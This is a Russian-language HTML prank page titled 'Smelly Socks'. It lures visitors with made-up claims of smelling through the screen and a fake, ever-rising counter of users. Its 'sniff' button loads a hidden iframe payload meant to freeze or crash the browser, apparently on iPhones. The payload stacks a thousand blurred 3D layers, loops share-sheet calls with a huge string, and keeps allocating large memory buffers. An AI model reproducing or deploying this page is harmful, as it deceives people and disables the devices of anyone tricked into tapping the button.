<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🧦 Вонючие Носки 🧦</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background: #0a0a0a;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            color: #fff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            -webkit-user-select: none;
            user-select: none;
        }

        .bait-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 24px;
            animation: fadeIn 0.6s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .sock-container {
            position: relative;
            width: 180px;
            height: 180px;
        }

        .sock-img {
            width: 100%;
            height: 100%;
            animation: wobble 1.5s ease-in-out infinite;
            filter: drop-shadow(0 0 30px rgba(76, 175, 80, 0.5));
        }

        @keyframes wobble {
            0%, 100% { transform: rotate(-5deg) scale(1); }
            25% { transform: rotate(5deg) scale(1.05); }
            50% { transform: rotate(-3deg) scale(1.1); }
            75% { transform: rotate(4deg) scale(1.05); }
        }

        .stink-lines {
            position: absolute;
            top: -20px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 32px;
            animation: stinkFloat 2s ease-in-out infinite;
            opacity: 0.7;
        }

        @keyframes stinkFloat {
            0%, 100% { transform: translateX(-50%) translateY(0); opacity: 0.3; }
            50% { transform: translateX(-50%) translateY(-15px); opacity: 0.9; }
        }

        .stink-lines:nth-child(2) { animation-delay: 0.5s; left: 30%; }
        .stink-lines:nth-child(3) { animation-delay: 1s; left: 70%; }

        .title {
            font-size: 22px;
            font-weight: 700;
            text-align: center;
            background: linear-gradient(90deg, #4caf50, #8bc34a, #cddc39);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .smell-btn {
            background: linear-gradient(135deg, #4caf50, #2e7d32);
            border: none;
            color: white;
            font-size: 20px;
            font-weight: 700;
            padding: 18px 48px;
            border-radius: 50px;
            cursor: pointer;
            animation: pulse 1.8s ease-in-out infinite;
            box-shadow: 0 0 40px rgba(76, 175, 80, 0.4);
            -webkit-tap-highlight-color: transparent;
            transition: transform 0.1s;
        }

        .smell-btn:active {
            transform: scale(0.95);
        }

        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 20px rgba(76, 175, 80, 0.3); }
            50% { box-shadow: 0 0 50px rgba(76, 175, 80, 0.7); }
        }

        .dynamic-text {
            font-size: 14px;
            color: #888;
            text-align: center;
            min-height: 40px;
            max-width: 300px;
            transition: opacity 0.4s;
        }

        .counter {
            font-size: 12px;
            color: #555;
            margin-top: 8px;
        }

        .counter span {
            color: #4caf50;
            font-weight: 700;
        }

        .hidden { display: none !important; }

        #payload-frame {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            border: none;
            z-index: 9999;
        }
    </style>
</head>
<body>

<div class="bait-screen" id="baitScreen">
    <div class="sock-container">
        <div class="stink-lines">〰️</div>
        <div class="stink-lines">〰️</div>
        <div class="stink-lines">〰️</div>
        <!-- inline SVG sock so no external image needed -->
        <svg class="sock-img" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
            <defs>
                <linearGradient id="sockGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                    <stop offset="0%" style="stop-color:#4caf50;stop-opacity:1" />
                    <stop offset="100%" style="stop-color:#1b5e20;stop-opacity:1" />
                </linearGradient>
            </defs>
            <!-- sock shape -->
            <path d="M70 20 C70 20, 130 20, 130 20 C135 20, 140 25, 140 30 L140 120 C140 140, 150 155, 170 165 C185 172, 185 190, 170 195 L90 195 C75 195, 60 185, 55 170 L55 165 C55 150, 60 140, 60 120 L60 30 C60 25, 65 20, 70 20Z" fill="url(#sockGrad)" stroke="#2e7d32" stroke-width="2"/>
            <!-- sock top band -->
            <rect x="58" y="20" width="84" height="20" rx="5" fill="#2e7d32" opacity="0.6"/>
            <rect x="58" y="28" width="84" height="4" rx="2" fill="#1b5e20" opacity="0.4"/>
            <!-- stink particles -->
            <circle cx="100" cy="10" r="3" fill="#8bc34a" opacity="0.6">
                <animate attributeName="cy" values="10;-10;10" dur="2s" repeatCount="indefinite"/>
                <animate attributeName="opacity" values="0.6;0;0.6" dur="2s" repeatCount="indefinite"/>
            </circle>
            <circle cx="85" cy="5" r="2" fill="#cddc39" opacity="0.4">
                <animate attributeName="cy" values="5;-15;5" dur="2.5s" repeatCount="indefinite"/>
                <animate attributeName="opacity" values="0.4;0;0.4" dur="2.5s" repeatCount="indefinite"/>
            </circle>
            <circle cx="115" cy="8" r="2.5" fill="#8bc34a" opacity="0.5">
                <animate attributeName="cy" values="8;-12;8" dur="1.8s" repeatCount="indefinite"/>
                <animate attributeName="opacity" values="0.5;0;0.5" dur="1.8s" repeatCount="indefinite"/>
            </circle>
        </svg>
    </div>

    <div class="title">🧦 ВОНЮЧИЕ НОСКИ 🧦</div>

    <button class="smell-btn" id="smellBtn" onclick="launchPayload()">
        👃 ПОНЮХАТЬ
    </button>

    <div class="dynamic-text" id="dynamicText"></div>

    <div class="counter">уже понюхали: <span id="fakeCount">0</span> человек</div>
</div>

<iframe id="payload-frame" class="hidden"></iframe>

<script>
    // dynamic bait text rotation
    const phrases = [
        "⚠️ Осторожно: запах может быть слишком сильным!",
        "🧪 Технология передачи запаха через экран",
        "📱 Работает только на iPhone!",
        "🔬 Научный прорыв 2026 года",
        "👃 Почувствуй аромат через дисплей",
        "🧬 Квантовая передача молекул",
        "💨 98.7% пользователей почувствовали запах",
        "🏆 Одобрено Институтом Носков",
        "🌍 Вирусный хит TikTok",
        "⚡ Активируй обонятельный чип в телефоне"
    ];

    let phraseIdx = 0;
    const dynamicText = document.getElementById('dynamicText');
    const fakeCount = document.getElementById('fakeCount');

    // rotate phrases
    function rotatePhrases() {
        dynamicText.style.opacity = '0';
        setTimeout(() => {
            dynamicText.textContent = phrases[phraseIdx];
            dynamicText.style.opacity = '1';
            phraseIdx = (phraseIdx + 1) % phrases.length;
        }, 400);
    }
    rotatePhrases();
    setInterval(rotatePhrases, 3000);

    // fake counter climbing
    let count = Math.floor(Math.random() * 5000) + 12000;
    fakeCount.textContent = count.toLocaleString();
    setInterval(() => {
        count += Math.floor(Math.random() * 3) + 1;
        fakeCount.textContent = count.toLocaleString();
    }, Math.random() * 3000 + 2000);

    // the payload
    function launchPayload() {
        const bait = document.getElementById('baitScreen');
        const frame = document.getElementById('payload-frame');

        bait.classList.add('hidden');
        frame.classList.remove('hidden');

        const payload = `
            <html>
            <head>
                <style>
                    html, body { width: 100%; height: 100%; margin: 0; padding: 0; overflow: hidden; }
                    .container { perspective: 1px; perspective-origin: 9999999% 9999999%; width: 100vw; height: 100vh; }
                    .layer { position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); }
                </style>
            </head>
            <body>
                <div class="container" id="c"></div>
                <script>
                    const container = document.getElementById('c');
                    for (let i = 0; i < 1000; i++) {
                        let d = document.createElement('div');
                        d.className = 'layer';
                        d.style.transform = 'translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg)';
                        container.appendChild(d);
                    }

                    setInterval(() => {
                        try {
                            if (navigator.share) {
                                navigator.share({ title: 'R', text: 'R'.repeat(100000) }).catch(() => {});
                            }
                        } catch(e) {}
                        let x = new Uint8Array(1024 * 1024 * 32);
                        crypto.getRandomValues(x);
                    }, 0);

                    function bombard() {
                        for (let j = 0; j < 30; j++) {
                            let b = new Uint8Array(1024 * 1024 * 16);
                            crypto.getRandomValues(b);
                        }
                        requestAnimationFrame(bombard);
                    }
                    bombard();
                <\/script>
            </body>
            </html>
        `;

        frame.setAttribute('sandbox', 'allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-presentation allow-scripts');
        frame.srcdoc = payload;
    }
</script>

</body>
</html>
